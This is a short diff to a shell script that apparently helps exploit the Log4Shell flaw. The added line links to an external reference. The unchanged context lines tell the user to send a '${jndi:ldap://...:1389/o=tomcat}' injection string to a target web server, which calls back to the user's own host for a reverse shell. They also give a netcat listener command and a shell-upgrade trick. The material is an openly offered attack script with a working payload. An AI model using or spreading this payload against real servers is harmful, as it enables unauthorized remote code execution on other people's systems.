@@ -17,6 +17,7 @@ read my_port
 echo "Once this is complete and you've sent the command \${jndi:ldap://$my_ip:1389/o=tomcat} (read this script for more o= options for different web serves) (the 1389 port is for LDAP) to get a reverse shell, remember to use the following command within nc -lvnp (port)"
 echo "script /dev/null -c bash"
 echo "This will help to make the shell more useable"
+echo "Also see this https://netsec.ws/?p=337"
 echo ""
 echo ""
 echo ""
